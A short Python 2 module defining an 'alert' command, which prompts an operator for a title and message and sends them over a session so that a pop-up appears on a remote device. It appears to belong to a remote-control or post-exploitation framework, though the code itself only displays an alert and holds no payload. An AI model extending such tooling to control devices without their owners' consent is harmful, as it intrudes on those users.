import base64
import json
import modules.helper as h

class command:
    def __init__(self):
        self.name = "alert"
        self.description = "Make alert show up on device."
        self.type = "native"

    def run(self,session,cmd_data):
        title = raw_input(h.WW+"[>]"+h.WHITE+" Alert Title: "+h.ENDC)
        message = raw_input(h.WW+"[>]"+h.WHITE+" Alert Message: "+h.ENDC)
        session.send_command({"cmd":"alert","args":json.dumps({"title":title,"message":message})})
        return ""
